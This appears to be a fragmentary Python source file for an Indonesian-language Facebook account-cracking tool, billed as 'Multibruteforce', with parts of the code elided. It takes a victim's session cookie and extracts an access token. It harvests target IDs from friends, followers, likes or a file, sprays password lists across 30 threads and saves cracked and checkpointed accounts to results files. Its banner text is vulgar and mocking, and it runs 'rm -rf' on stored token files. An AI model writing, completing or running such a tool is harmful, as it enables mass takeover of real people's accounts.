...
def logo():
	print(f"""{P} 
\x1b[0m───────────────────────────────────────────────────────────────\n {H}•{K}•{H}•\n\x1b[1;96m'########:'########:'########::'##::::'##:'##::::'##:'##::::'##:\n\x1b[1;96m... ##..:: ##.....:: ##.... ##: ###::'###: ##:::: ##:. ##::'##::\n\x1b[1;96m::: ##:::: ##::::::: ##:::: ##: ####'####: ##:::: ##::. ##'##:::\n\x1b[1;96m::: ##:::: ######::: ########:: ## ### ##: ##:::: ##:::. ###::::\n\x1b[1;96m::: ##:::: ##...:::: ##.. ##::: ##. #: ##: ##:::: ##::: ## ##:::\n\x1b[1;96m::: ##:::: ##::::::: ##::. ##:: ##:.:: ##: ##:::: ##:: ##:. ##::\n\x1b[1;96m::: ##:::: ########: ##:::. ##: ##:::: ##:. #######:: ##:::. ##:\n\x1b[1;96m:::..:::::........::..:::::..::..:::::..:::.......:::..:::::..::\n\x1b[0m───────────────────────────────────────────────────────────────\n {K}[{N}>_{K}] {N}Author   : Changcuters\n {K}[{N}>_{K}] {N}Type     : Multibruteforce\n {K}[{N}>_{K}] {N}Whatsaap : 0819-0776-1235\n {K}[{N}>_{K}] {N}Status   : Ngocok Memek [\x1b[1;92m Premium {N}]\n\x1b[0m───────────────────────────────────────────────────────────────""")
#-
def starting():
	print(f"\n {K}[{N}>_{K}] {N}AKAN DI SIMPAN DI FILE : {H}results/OK-{_datetime_}{N}")
	print(f" {K}[{N}>_{K}] {N}AKAN DI SIMPAN DI FILE : {K}results/CP-{_datetime_}{N}")
	print(f" {K}[{N}>_{K}] {N}ANDA BISA MAINKAN MODE PESAWAT 3 DETIK DALAM 1000ID !\n")
#-
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print(f" {K}[{N}>_{K}] {N}CRACK SELESAI CIL...")
		print(f" {K}[{N}>_{K}] {N}TOTAL {H}OK {N}ANDA : {H}{len(ok)}")
		print(f" {K}[{N}>_{K}] {N}TOTAL {K}CP {N}ANDA : {K}{len(cp)}")
		os.system("exit")
	else:
		print(f" {K}[{N}>_{K}] {N}KAMU TIDAK MENDAPATKAN HASIL APAPUN :(")
		exit()
#-
def metode():
	print("")
...
def masuk():
	...
	print(f" {K}[{N}>_{K}] {N}LUH MATI GUE PARTY")
	cokis = input(f" {K}[{N}>_{K}] {N}MASUKAN COOKIE BOCIL : {H}")
	if cokis in [""," "]:masuk()
	else:
		data_head = {
		...
		try:
			...
			if "EAAG" in coli:
				...
				comen(cokis)
		except AttributeError:print(f"\n {K}[{N}>_{K}] {N}COOKIE INVALID");time.sleep(3);masuk()
		except UnboundLocalError:print(f"\n {K}[{N}>_{K}] {N}COKIE INVALID");time.sleep(3);masuk()
		except requests.exceptions.TooManyRedirects:print(f"\n {K}[{N}>_{K}] {N}MASUKAN COKIE ANDA DENGAN BENAR");time.sleep(3);masuk()
#-
def comen(cokis):
	kuki = cokis
	...
	print(f"\n {K}[{N}>_{K}] {N}LOGIN BERHASIL, TOLONG TUNGGU SEBENTAR CIL");time.sleep(3)
	menu()
...
def menu():
	...
	try:
		...
		print(f" {K}[{N}>_{K}] {N} SELAMAT DATANG BOCIL² NGAKU² HACKER");time.sleep(3);masuk()
	try:
		...
		print(f" {K}[{N}>_{K}] {N}COKIE INVALID");os.system("rm -rf Data/Token.txt && rm -rf Data/cokie.txt");time.sleep(3);masuk()
	except requests.exceptions.ConnectionError:exit(" [%s×%s] Tidak ada koneksi"%(M,N))
	logo()
	print(f" {K}[{N}>_{K}] {N}SELAMAT DATANG : {H}{kamu}")
	print(f" {K}[{N}>_{K}] {N}IP ADRESS KAMU : {H}{ip}")
	print("\x1b[0m───────────────────────────────────────────────────────────────")
	...
	print(f" {K}[{N}4{K}] {N}CRACK DARI CREATE NEW FILE")
...
def pilihan(memec,token,cokie):
	if memec in [""," "]:menu()
		...
		print(f"\n {K}[{N}>_{K}] {N}KETIK 'ME' JIKA INGIN CRACK DARI DAFTAR TEMAN")
		idne = input(f" {K}[{N}>_{K}] {N}MASUKAN ID : ")
		return publik(idne)
	elif memec in ["2","02"]:
		print(f"\n {K}[{N}>_{K}] {N}KETIK 'ME' JIKA INGIN CRACK DARI DAFTAR TEMAN")
		return masal(token, cokie)
	elif memec in ["3","03"]:
		print(f"\n {K}[{N}>_{K}] {N}KETIK 'ME' JIKA CRACK DARI DAFTAR FOLLOWERS SENDIRI")
		idne = input(f" {H}•{K}• {N}Masukan Id : ")
		return followers(idne, token, cokie)
	elif memec in ["4","04"]:
		print(f"\n {K}[{N}>_{K}] {N}JIKA TIDAK ADA FILE SILAKAN BUAT TERLEBIH DAHULU!")
		filex = input(f" {K}[{N}>_{K}] {N}NAMA FILE : ")
		if filex in [""," "]:menu()
		else:
			io = open(filex,"r").readlines()
			for memekkamu in io:
				id.append(memekkamu)
		print(f" {K}[{N}>_{K}] {N}TOTAL ID : {len(id)}")
		return bruteforce().__class__(id)
	elif memec in ["5","05"]:
		print(f"\n {K}[{N}>_{K}] {N}PASTIKAN ID BERSIFAT PUBLIK & MEMILIKI LIKES")
		_uid_ = input(f" {K}[{N}>_{K}] {N}MASUKAN ID : ")
		return likes(_uid_,token, cokie)
	elif memec in ["6","06"]:
		print(f"\n {K}[{N}>_{K}] {N}MASUKAN NAMA FILE ANDA YANG BERISI AKUN CHEKPOINT")
		nama_file = input(f" {K}[{N}>_{K}] {N}NAMA FILE : ")
		try:
...
def publik(idne):
	try:
		...
		print(f" {K}[{N}>_{K}] {N}TOTAL ID : {len(id)}")
		return bruteforce().__class__(id)
	except KeyError:print(f"\n {K}[{N}>_{K}] {N}ID GAGAL DI TEMUKAN");time.sleep(3);menu()

def masal(token, cokie):
	try:
		tambah = int(input(f" {K}[{N}>_{K}] {N}JUMLAH ID : "))
	except:tambah = 1
...
def followers(idne, token, cokie):
	try:
		...
		print(f"\n {K}[{N}>_{K}] {N}ID TIDAK PUBLIK!");time.sleep(3);menu()
	print(f" {K}[{N}>_{K}] {N}TOTAL ID : {len(id)}")
	return bruteforce().__class__(id)
...
def likes(_uid_, token, cokie):
	try:
		...
		print(f"\n {K}[{N}>_{K}] {N}ID TIDAK PUBLIK!");time.sleep(2);menu()
	print(f" {K}[{N}>_{K}] {N}TOTAL ID : {len(id)}")
	return bruteforce().__class__(id)
...
#		seld.id = id
		print(f"\n {K}[{N}>_{K}] {N}TAMPILKAN APLIKASI Y/T  ")
		pilih = input(f" {K}[{N}>_{K}] {N}PILIH : ")
		if pilih in [""," "]:beuteforce(id)
		elif pilih in ["Y","y"]:apk.append("y")
		else:apk.append("t")
		print(f"\n {K}[{N}>_{K}] {N}TAMPILKAN CHEKPOINT OPSI Y/T ")
		_code_ = input(f" {K}[{N}>_{K}] {N}PILIH : ")
		if _code_ in [""," "]:menu()
	...
	def wordlist(self):
		...
		__pw__ = input(f" {K}[{N}>_{K}] {N}PILIH : ")
		return self.masukan_pass(__pw__)

	def masukan_pass(self, __pw__):
		if __pw__ in [""," "]:menu()
		elif __pw__ in ["1","01"]:
			print(f"\n {K}[{N}>_{K}] {N}GUNAKAN KOMA UNTUK PEMISAHAN PASSWORD")
			_pepek_ = input(f" {K}[{N}>_{K}] {N}PASSWORD : ")
			...
			print(f"\n {K}[{N}>_{K}] {N}GUNAKAN KOMA UNTUK PEMISAHAN PASSWORD NYA!")
			_pasx_ = input(f" {K}[{N}>_{K}] {N}PASSWORD : ")
			if len(_pasx_)<=5:exit("\n GUNAKAN 6 KATAKTER!")
			else:self.gabungan(_pasx_)
		else:
			exit(f"\n {K}[{N}>_{K}] {N}INPUT ANDA SALAH")

	def manual(self, _pepek_):
		metode()
		_ceh_ = input(f" {K}[{N}>_{K}] {N}PILIH : ")
		if _ceh_ in ["1","01"]:
			starting()
			...
			exit(f"\n {K}[{N}>_{K}] {N}INPUT YANG KAMU MASUKAN SALAH!.")

	def otomatis(self):
		_kopi_ = input(f" {K}[{N}>_{K}] {N}PILIH : ")
		if _kopi_ in [""]:menu()
		elif _kopi_ in ["1","01"]:
			starting()
			with khamdihiXD(max_workers=30) as unikers:
			...
			print(f"\n {K}[{N}>_{K}] {N}PILIH INPUT YANG BENER");exit()
	def gabungan(self, _pasx_):
		metode()
		_lover_ = input(f" {K}[{N}>_{K}] {N}PILIH : ")
		if _lover_ in [""," "]:menu()
